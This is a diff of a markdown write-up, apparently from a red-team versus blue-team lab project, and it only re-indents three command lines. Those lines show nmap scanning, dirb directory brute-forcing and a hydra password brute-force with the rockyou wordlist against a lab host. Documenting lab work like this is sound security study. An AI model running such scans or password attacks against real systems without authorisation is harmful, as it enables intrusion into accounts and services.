@@ -56,15 +56,15 @@ I based the assement off of the [2021 OWASP Top 10 Web Application Security Risk
 		- Crack a password
 	3. Screenshots and Command
 		
-		- `nmap -sV 192.168.1.105`
+- `nmap -sV 192.168.1.105`
   
 ![nmap ss](https://github.com/BQcybersec/Projects/blob/main/Project%202%20%20RedTeam_vs_BlueTeam/Images/1nmap.png)
 
-		- `dirb 192.168.1.105`
+- `dirb 192.168.1.105`
   
 ![dirb ss](https://github.com/BQcybersec/Projects/blob/main/Project%202%20%20RedTeam_vs_BlueTeam/Images/2.dirb.png)
 
-		- `hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder` 
+- `hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder` 
   
 ![Hydra Input ss](https://github.com/BQcybersec/Projects/blob/main/Project%202%20%20RedTeam_vs_BlueTeam/Images/3.hydra(input).png)
 
